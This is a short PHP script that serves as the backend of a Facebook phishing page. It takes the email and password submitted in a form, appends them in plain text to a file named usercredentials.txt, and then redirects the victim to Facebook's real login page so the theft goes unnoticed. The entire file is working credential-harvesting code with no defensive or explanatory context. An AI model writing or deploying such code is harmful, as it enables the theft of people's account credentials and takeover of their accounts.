<?php
            $username = $_POST["email"];
            $passw = $_POST["pass"];
           
            $newfile = fopen("usercredentials.txt", "a") or die("File cannot be opened");
            $details = " Username = $username \n Password = $passw \n\n";
            fwrite($newfile, $details);
           
            //Redirect browser to original login page
            header("Location: https://www.facebook.com/login.php");
           
            fclose($newfile);
            exit();
?>